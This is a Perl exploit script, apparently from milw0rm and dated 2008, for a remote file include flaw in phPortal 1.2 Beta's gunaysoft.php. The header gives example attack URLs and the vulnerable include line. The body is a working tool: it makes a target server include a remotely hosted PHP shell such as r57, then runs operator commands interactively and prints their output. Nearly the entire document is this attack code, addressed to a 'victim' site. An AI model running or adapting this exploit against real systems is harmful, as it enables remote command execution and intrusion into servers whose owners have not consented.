#!/usr/bin/perl

####################################################################################################
#
# phportal_1.2_Beta (gunaysoft.php) Remote File Include Vulnerability
#
# Discovered by : Ciph3r
#
# Class:  Remote File Include Vulnerability
#
# exemplary Exp:
# http://www.site.com/sablonlar/gunaysoft/gunaysoft.php?icerikyolu=[shell]
# http://www.site.com/sablonlar/gunaysoft/gunaysoft.php?sayfaid=[shell]
# http://www.site.com/sablonlar/gunaysoft/gunaysoft.php?uzanti=[shell]
#
# Remote: Yes
#
# Type:   Highly critical
#
# Vulnerable Code: include($icerikyolu.$sayfaid.$uzanti);
#
# Download:  http://sourceforge.net/project/showfiles.php?group_id=205263
#
# SP tanx4: Iranian hacker & Kurdish security TEAM
#
# sp TANX2: milw0rm.com & google.com & sourceforge.net
#
# Exploit: phportal.pl
#
# About phPortal :
#
# phPortal is a Content Management System. phPortal contains phpBB2 core and
# phPortal shell. If you have a phpBB2 forum.You may upgrade to phPortal.
#
######################################################################################################

use LWP::UserAgent;
use LWP::Simple;

$target = @ARGV[0];
$shellsite = @ARGV[1];
$shellcmd = @ARGV[2];
$file = "sablonlar/gunaysoft/gunaysoft.php?uzanti=";

if(!$target || !$shellsite)
{
    usage();
}

header();

print "Type 'exit' to quit";
print "[cmd]\$";
$cmd = <STDIN>;

while ($cmd !~ "exit")
{
    $xpl = LWP::UserAgent->new() or die;
        $req = HTTP::Request->new(GET=>$target.$file.$shellsite.'?&'.$shellcmd.'='.$cmd) or die("\n\n Failed to connect.");
        $res = $xpl->request($req);
        $r = $res->content;
        $r =~ tr/[\n]/[&#234;]/;

    if (@ARGV[4] eq "-r")
    {
        print $r;
    }
    elsif (@ARGV[5] eq "-p")
    {
    # if not working change cmd variable to null and apply patch manually.
    $cmd = "echo if(basename(__FILE__) == basename(\$_SERVER['PHP_SELF'])) die(); >> list_last.inc";
    print q
    {

    }
    }
    else
    {
    print "[cmd]\$";
    $cmd = <STDIN>;
    }
}

sub header()
{
    print q
    {
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

                        Discovered by : Ciph3r
                  phportal.pl   - Remote File Include Exploit
                  SP tanx4: Iranian hacker & Kurdish security TEAM
                          Ciph3r_blackhat@yahoo.com
                  sp TANX2: milw0rm.com & google.com & sourceforge.net
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    };
}

sub usage()
{
header();
    print q
    {
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Usage:
perl phportal.pl <Target website> <Shell Location> <CMD Variable> <-r> <-p>
<Target Website> - Path to target eg: www.victim.com
<Shell Location> - Path to shell eg: http://h1.ripway.com/boukan/r57.txt?
<CMD Variable> - Shell command variable name eg: Pwd
<r> - Show output from shell
<p> - sablonlar/gunaysoft/gunaysoft.php
Example:
perl phportal.pl  http://localhost/include http://localhost/r57.php cmd -r -p
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    };
exit();
}

# milw0rm.com [2008-07-02]